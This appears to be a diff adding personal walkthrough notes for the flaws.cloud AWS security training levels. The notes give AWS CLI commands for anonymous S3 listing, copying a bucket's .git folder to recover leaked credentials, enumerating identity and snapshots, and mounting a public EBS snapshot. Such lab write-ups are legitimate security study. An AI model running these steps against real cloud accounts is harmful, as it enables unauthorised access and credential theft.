@@ -1,0 +1,24 @@
+1.) Getting region and type of instance
+  - Use DNS entries: dig +short flaws.cloud
+  - query nameserver to get DNS information that gives up the type and region: nslookup IP-FROM-DIG
+  
+2.) Querying s3 instances
+  - You can use the API: (aws s3 ls s3://flaws.cloud/ --no-sign-request --region <region found from dns entry>)
+    + --no-sign-request: Disables signing requests - creds wont be loaded
+
+3.) Look for creds in buckets (left in .git/ quite often)
+  - If have read & list access I could view the .git/ if there is one.
+  - (aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ --recursive)
+  - To get the git information: (aws s3 cp s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git ./git --recursive)
+  - Once I have credentials I can create a profile with them: (aws configure --profile flaws)
+  - Then view all their buckets: (aws --profile flaws s3 ls)
+  
+4.) Use key to get user information
+  - Get user info: (aws --profile flaws sts get-caller-identity)
+  - Is snapshot open to everyone?: (aws ec2 describe-snapshot-attribute --snapshot-id snap-0b49342abd1bdcb89 --attribute createVolumePermission --profile flaws --region <REGION-HERE-IF_NOT-IN-CRED-PROFILE>)
+  - If CreateVolumePemissions has Group: all then yes we can create a volume out of the snapshot
+  - Get snapshots from user id: (aws --profile flaws ec2 describe-snapshots --owner-id 975426262029 --region <REGION-HERE-IF_NOT-IN-CRED-PROFILE>)
+
+5.) Use key to get public snapshot
+  - Create volume from public snapshot: (aws ec2 create-volume --availability-zone <ZONE> --region <REGION-HERE-IF_NOT-IN-CRED-PROFILE> --snapshot-id snap-0b49342abd1bdcb89)
+  
